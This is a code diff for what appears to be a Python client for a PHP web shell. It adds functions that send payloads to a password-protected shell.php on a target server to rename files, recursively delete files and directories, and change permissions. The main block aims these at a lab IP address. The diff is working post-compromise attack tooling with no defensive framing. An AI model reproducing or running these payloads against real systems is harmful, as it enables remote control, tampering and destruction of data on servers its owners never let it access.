@@ -120,6 +120,74 @@ def uploadFile(url, password, buffer, filePath):
     else:
         raise Exception('PassWord Error!')
 
+def renameFile(url, password, src, dst):
+    ra, rb, rs, rd = genRandomStr(4)
+    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
+              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
+              'try{$m=get_magic_quotes_gpc();$src=base64_decode(m?stripslashes($_POST["'+ rs +'"]):$_POST' \
+              '["' + rs +'"]);$dst=base64_decode(m?stripslashes($_POST["'+ rd +'"]):$_POST["'+ rd +'"]' \
+              ');echo(rename($src,$dst)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+    data = {password: payload, rs: b64encode(src.encode()), rd: b64encode(dst.encode())}
+    r = requests.post(url, data, timeout=0.8)
+    rt = r.text
+    # 排除404等的测试结果
+    if r.status_code != 200:
+        raise Exception('status_code == '+str(r.status_code))
+    # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
+    if rt.startswith(ra) and rt.endswith(rb):
+        return rt[8:-8]
+    else:
+        raise Exception('PassWord Error!')
+
+def deleteFile(url, password, file):
+    ra, rb, rc = genRandomStr(3)
+    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
+              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
+              'try{function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!=".."))' \
+              '{@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);' \
+              'return @rmdir($p);}$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["'+ rc +'"]):$_POST' \
+              '["' + rc +'"]);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};}' \
+              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+    data = {password: payload, rc: b64encode(file.encode())}
+    r = requests.post(url, data, timeout=0.8)
+    rt = r.text
+    # 排除404等的测试结果
+    if r.status_code != 200:
+        raise Exception('status_code == '+str(r.status_code))
+    # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
+    if rt.startswith(ra) and rt.endswith(rb):
+        return rt[8:-8]
+    else:
+        raise Exception('PassWord Error!')
+
+def chmodFile(url, password, file, mode):
+    ra, rb, rc, rd = genRandomStr(4)
+    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
+              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb+ '";}ob_start();try' \
+              '{$m=get_magic_quotes_gpc();$FN=base64_decode(m?stripslashes($_POST["' + rc+ '"]):$_POST["' + rc + '"]);' \
+              '$mode=base64_decode(m?stripslashes($_POST["' + rd + '"]):$_POST["' + rd +'"]);echo(chmod($FN,octdec($mode))?"1":"0")' \
+              ';;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+    data = {password: payload, rc: b64encode(file.encode()), rd: b64encode(mode.encode())}
+    r = requests.post(url, data, timeout=0.8)
+    rt = r.text
+    # 排除404等的测试结果
+    if r.status_code != 200:
+        raise Exception('status_code == '+str(r.status_code))
+    # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
+    if rt.startswith(ra) and rt.endswith(rb):
+        return rt[8:-8]
+    else:
+        raise Exception('PassWord Error!')
+
 def formatFileSize(bytes, precision):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB']:
         if abs(bytes) < 1024.0:
@@ -132,7 +200,9 @@ def formatFileSize(bytes, precision):
 if __name__ == '__main__':
     url = 'http://192.168.20.131/shell.php'
     password = '0'
-    print(downloadFile(url, password, '/var/www/html/1.py'))
-    print(uploadFile(url, password, '123', '/var/www/html/1.txt'))
-    print(scanDir(url, password, '/root/'))
-    print(formatFileSize(102401, 2))
+    #print(downloadFile(url, password, '/var/www/html/1.py'))
+    #print(uploadFile(url, password, '123', '/var/www/html/1.txt'))
+    #print(scanDir(url, password, '/root/'))
+    #print(formatFileSize(102401, 2))
+    #print(renameFile(url, password, '/var/www/html/1', '/var/www/html/2'))
+    print(chmodFile(url, password, '/var/www/html/shell.php', '0111'))
